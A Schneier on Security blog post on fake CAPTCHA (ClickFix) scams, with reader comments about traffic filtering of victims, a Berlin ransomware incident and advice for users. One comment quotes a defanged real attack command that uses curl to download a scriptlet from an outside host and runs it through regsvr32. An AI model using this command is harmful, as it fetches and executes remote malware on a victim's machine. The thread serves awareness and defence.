---
title: Fake CAPTCHA Scams
url: https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html
source: Schneier on Security
date: 2026-09-16
fetch_date: 2026-09-17T06:59:34.434231
---

# Fake CAPTCHA Scams

# [Schneier on Security](https://www.schneier.com/)

Menu

* [Blog](https://www.schneier.com)
* [Newsletter](https://www.schneier.com/crypto-gram/)
* [Books](https://www.schneier.com/books/)
* [Essays](https://www.schneier.com/essays/)
* [News](https://www.schneier.com/news/)
* [Talks](https://www.schneier.com/talks/)
* [Academic](https://www.schneier.com/academic/)
* [About Me](https://www.schneier.com/blog/about/)

### Search

*Powered by [DuckDuckGo](https://duckduckgo.com/)*

Blog

Essays

Whole site

### Subscribe

[![Atom](https://www.schneier.com/wp-content/uploads/2019/10/rss-32px.png)](https://www.schneier.com/feed/atom/)[![Facebook](https://www.schneier.com/wp-content/uploads/2019/10/facebook-32px.png)](https://www.facebook.com/bruce.schneier)[![Twitter](https://www.schneier.com/wp-content/uploads/2019/10/twitter-32px.png)](https://twitter.com/schneierblog)[![Email](https://www.schneier.com/wp-content/uploads/2019/10/email-32px.png)](https://www.schneier.com/crypto-gram)

[Home](https://www.schneier.com)[Blog](https://www.schneier.com/blog/archives/)

## Fake CAPTCHA Scams

New [variant](https://www.malwarebytes.com/cybersecurity/basics/fake-captcha-scams) of an old scam: Use the framing of a CAPTCHA to get an unsuspecting user to download and run a malicious program.

Tags: [captchas](https://www.schneier.com/tag/captchas/), [scams](https://www.schneier.com/tag/scams/)

[Posted on September 16, 2026 at 7:25 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html) •
[8 Comments](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html#comments)

### Comments

Q •
[September 16, 2026 8:16 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458031)

I’ve never seen the fake CAPTCHA yet. but I wonder if the code is clever enough to sniff the user agent and only offer it to Windows users?

Since I use Linux, and I don’t fake the user agent string, perhaps I won’t ever see one of these things. When I press the required Win+R I see the application finder, not a box to run commands.

[Daniel Jones](https://tuxxin.com/blog/carnival-cclpromos-malvertising) •
[September 16, 2026 8:30 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458032)

I recently came across one in an investigation and yes it did run an active TDS that fingerprinted users device and network information and then actively routed to different payloads to different devices. Datacenter based IP’s were nearly always served a clean benign page which most of todays URL scanners use datacenter based IP’s. However if the user was on a residential or mobile IP, they’re served the actual payload. If the TDS fingerprinted as an bot/scanner it would send you to a monetization domain.

I just published the full article and whitepaper on this investigation, [A real Carnival Cruise Line email was serving customers malware](https://tuxxin.com/blog/carnival-cclpromos-malvertising), you’ll actually see some screenshots of your fake CAPTCHA on it.

[\_Jim](https://freerepublic.com/~jim/) •
[September 16, 2026 8:49 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458034)

Experienced this little script (below) as part of a captcha on a well-known website in the form of a pop-up that requested the “Windows Key + R etc” routine be performed.

This was what was to be ‘pasted’ and executed (can I post this here for forensic purposes?)

> pcalua[dot]exe -a cmd -c “/c curl[dot]exe -s <https://193-233-126-53> [dot] sslip [dot] io/d3f8a142c9/verification[dot]sct -o %TEMP%\v[dot]sct&&regsvr32 /s /n /u /i:%TEMP%\v[dot]sct scrobj[dot]dll”

‘[dot]’ or ‘ [dot] ‘ replaces “.”

Anonymous •
[September 16, 2026 9:49 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458036)

You’re a little late to this.
Research the terms “ClickFix” and “FileFix” for more information.

KC •
[September 16, 2026 10:04 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458037)

**“First phishing, then a fake captcha and a terminal command** – this is how the cyberattack on Berlin proceeded, according to initial analyses.”

The Berlin Senate is recovering from a ClickFix variant attack initiated in August 2026.

<https://www.heise.de/en/news/BSI-explains-first-attack-vector-on-Berlin-authorities-11444212.html>

<https://en.wikipedia.org/wiki/2026_ransomware_attack_on_Berlin>

[Perrystate](https://perthrealestateagency.com.au/) •
[September 16, 2026 10:19 AM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458038)

The clever part of this scam is that it turns a familiar security check into the attack itself. People are so accustomed to completing CAPTCHAs that they may follow instructions without questioning them. A useful rule of thumb: if a CAPTCHA asks you to download software, open a terminal or run a command, close the page immediately. A genuine human-verification check shouldn’t require any of those actions.

John White •
[September 16, 2026 2:39 PM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458045)

I have seen a number of these scams recently, where Cloudflare is pushing Android malware as its primary captcha option. Very disturbing.

anonymouse random •
[September 16, 2026 4:45 PM](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/#comment-458051)

@Perrystate: “The clever part of this scam is that it turns a familiar security check into the attack itself. People are so accustomed to completing CAPTCHAs that they may follow instructions without questioning them.”

I have seen phishes in the form of CAPTCHAs that pre-fill your email address and solicit your password to “verify” that you “are not a bot”. Don’t get socially-engineered!

[![Atom Feed](https://www.schneier.com/wp-content/themes/schneier/assets/images/rss.png)
Subscribe to comments on this entry](https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html/feed/)

## Leave a comment [Cancel reply](/blog/archives/2026/09/fake-captcha-scams.html#respond)

[Blog moderation policy](https://www.schneier.com/blog/archives/2024/06/new-blog-moderation-policy.html)

[Login](https://www.schneier.com/wp-login.php?redirect_to=https%3A%2F%2Fwww.schneier.com%2Fblog%2Farchives%2F2026%2F09%2Ffake-captcha-scams.html "Login")

Name

Email

URL:

[ ]  Remember personal info?

Fill in the blank: the name of this blog is Schneier on \_\_\_\_\_\_\_\_\_\_\_ (required):

Comments:
![](https://www.schneier.com/wp-content/themes/schneier/assets/images/loader.gif)

**Allowed HTML**
<a href="URL"> • <em> <cite> <i> • <strong> <b> • <sub> <sup> • <ul> <ol> <li> • <blockquote> <pre>
**Markdown Extra** syntax via <https://michelf.ca/projects/php-markdown/extra/>

[ ]  Notify me of new posts by email.

Δ

[← 25 Years of Mass Surveillance Is Enough](https://www.schneier.com/blog/archives/2026/09/25-years-of-mass-surveillance-is-enough.html)

Sidebar photo of Bruce Schneier by Joe MacInnis.

[Powered by WordPress](https://wordpress.com/website-builder/?partner_domain=www.schneier.com&utm_source=Automattic&utm_medium=colophon&utm_campaign=Concierge%20Referral&utm_term=www.schneier.com) [Hosted by Pressable](https://pressable.com/?utm_source=Automattic&utm_medium=rpc&utm_campaign=Concierge%20Referral&utm_term=www.schneier.com)

### About Bruce Schneier

![](https://www.schneier.com/wp-content/uploads/2019/10/Bruce-Schneier.jpg)

I am a [public-interest technologist](https://public-interest-tech.com/), working at the intersection of security, technology, and people. I've been writing about security issues on my [blog](/) since 2004, and in my monthly [newsletter](/crypto-gram/) since 1998. I'm a fellow and lecturer at Harvard's [Kennedy School](https://www.hks.harvard.edu/faculty/bruce-schneier) and the [Munk School](https://munkschool.utoronto.ca/) at the University of Toronto, a board member of [EFF](h...